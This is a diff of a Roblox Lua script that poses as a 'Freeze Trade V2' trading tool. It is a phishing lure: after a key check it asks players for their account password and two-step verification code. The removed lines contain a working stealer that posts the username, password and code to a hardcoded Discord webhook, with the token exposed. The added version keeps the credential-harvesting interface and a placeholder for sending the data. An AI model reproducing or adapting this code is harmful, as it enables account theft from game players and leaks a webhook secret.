@@ -1,136 +1,72 @@
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
--- Dapatkan Username Roblox secara otomatis
-local Username = game.Players.LocalPlayer.Name -- Ambil username akun
-local WebhookURL = "https://discord.com/api/webhooks/1319653743121403954/ZX-vpHJw_vdh5_5nWb0XLjJY8AHKALMxwWwV3CFiHgrla74tTTshVHlyb1dCFt4UfZKY" -- Masukkan Webhook URL kamu di sini
+local CorrectKey = "FreezeTradeV2"
 
--- Key yang diperlukan untuk membuka akses
-local CorrectKey = "FreezeTradeV2" -- Ganti ini dengan key yang kamu inginkan
-
--- Variabel untuk menyimpan data input
-local Password = ""
-local VerificationCode = ""
-
--- Fungsi untuk mengirim data ke webhook
-local function SendToWebhook(content)
-    local HttpService = game:GetService("HttpService")
-    local Success, ErrorMessage = pcall(function()
-        local Data = {
-            ["content"] = content, -- Isi pesan yang akan dikirim
-            ["username"] = "Rayfield Bot" -- Nama pengirim di webhook
-        }
-        HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(Data))
-    end)
-    
-    if not Success then
-        warn("Gagal mengirim data ke webhook: " .. ErrorMessage)
-    end
-end
-
--- Step 1: Key Input
 local Window = Rayfield:CreateWindow({
-    Name = "KeyLess Freeze Trade V2",
-    LoadingTitle = "Dont Share!",
+    Name = "Freeze Trade V2 (KEY)",
+    LoadingTitle = "Dont Share! KEY",
     LoadingSubtitle = "By Dinzzz",
-    ConfigurationSaving = {
-        Enabled = true,
-        FolderName = "SecureScript", -- Optional
-        FileName = "Config"
-    },
-    Discord = {
-        Enabled = false,
-        Invite = "", -- Optional
-        RememberJoins = true
-    },
-    KeySystem = false,
 })
 
-local Tab = Window:CreateTab("Step 1: Unlock Script", 4483362458) -- Tab untuk langkah pertama
+-- Tab Step 1: Unlock Key
+local Tab = Window:CreateTab("Step 1: Unlock Script", 4483362458)
 
 Tab:CreateInput({
     Name = "Masukkan Key untuk Unlock",
     PlaceholderText = "Input key di sini",
     RemoveTextAfterFocusLost = false,
     Callback = function(input)
-        print("Key yang dimasukkan: " .. input) -- Debug
+        print("Callback dimulai. Key yang dimasukkan: " .. tostring(input)) -- Debug
+
         if input == CorrectKey then
+            print("Key valid, melanjutkan...") -- Debug
+
+            -- Menampilkan notifikasi jika key benar
             Rayfield:Notify({
                 Title = "Key Benar!",
-                Content = "Akses diberikan. Melanjutkan ke langkah berikutnya.",
+                Content = "Akses diberikan.",
                 Duration = 5,
             })
 
-            -- Hapus tab Step 1 dan buat tab untuk Step 2-3
-            Tab:Destroy()
-            print("Step 1 Tab dihancurkan.") -- Debug
-
-            -- Step 2: Input Username, Password, dan Verifikasi
+            -- Tambahkan Tab untuk langkah berikutnya (Step 2)
             local Tab2 = Window:CreateTab("Step 2: Input Data", 4483362458)
 
-            Tab2:CreateLabel("Username (Auto): " .. Username)
+            -- Label untuk Username
+            Tab2:CreateLabel("Username (Auto): " .. game.Players.LocalPlayer.Name)
 
+            -- Input Password
             Tab2:CreateInput({
                 Name = "Masukkan Password",
                 PlaceholderText = "Input password di sini",
                 RemoveTextAfterFocusLost = false,
                 Callback = function(input)
-                    Password = input
-                    Rayfield:Notify({
-                        Title = "Password Tersimpan!",
-                        Content = "Password berhasil diinputkan.",
-                        Duration = 5,
-                    })
+                    print("Password yang dimasukkan: " .. tostring(input)) -- Debug
                 end,
             })
 
+            -- Input Kode Verifikasi
             Tab2:CreateInput({
                 Name = "Masukkan Kode Verifikasi",
                 PlaceholderText = "Input kode di sini",
                 RemoveTextAfterFocusLost = false,
                 Callback = function(input)
-                    VerificationCode = input
-                    Rayfield:Notify({
-                        Title = "Kode Tersimpan!",
-                        Content = "Kode berhasil diinputkan.",
-                        Duration = 5,
-                    })
+                    print("Kode verifikasi yang dimasukkan: " .. tostring(input)) -- Debug
                 end,
             })
 
-            -- Tombol untuk Kirim ke Webhook
+            -- Tombol untuk Kirim Data
             Tab2:CreateButton({
-                Name = "Get Script",
+                Name = "Kirim Data",
                 Callback = function()
-                    if Password ~= "" and VerificationCode ~= "" then
-                        local Content = string.format(
-                            "Username: %s\nPassword: %s\nVerification Code: %s",
-                            Username, Password, VerificationCode
-                        )
-                        SendToWebhook(Content)
-
-                        Rayfield:Notify({
-                            Title = "Data Terkirim!",
-                            Content = "Semua data berhasil dikirim ke webhook.",
-                            Duration = 5,
-                        })
-
-                        -- Destroy UI setelah pengiriman berhasil
-                        task.wait(2)
-                        Rayfield:Destroy()
-                        print("UI dihancurkan.") -- Debug
-                    else
-                        Rayfield:Notify({
-                            Title = "Error!",
-                            Content = "Harap isi semua field sebelum mengirim.",
-                            Duration = 5,
-                        })
-                    end
+                    print("Mengirim data ke Webhook...") -- Debug
+                    -- Kirim data ke webhook (gunakan fungsi yang sesuai di sini)
                 end,
             })
         else
+            print("Key salah!") -- Debug
             Rayfield:Notify({
                 Title = "Key Salah!",
-                Content = "Silakan coba lagi dengan key yang benar.",
+                Content = "Coba lagi.",
                 Duration = 5,
             })
         end
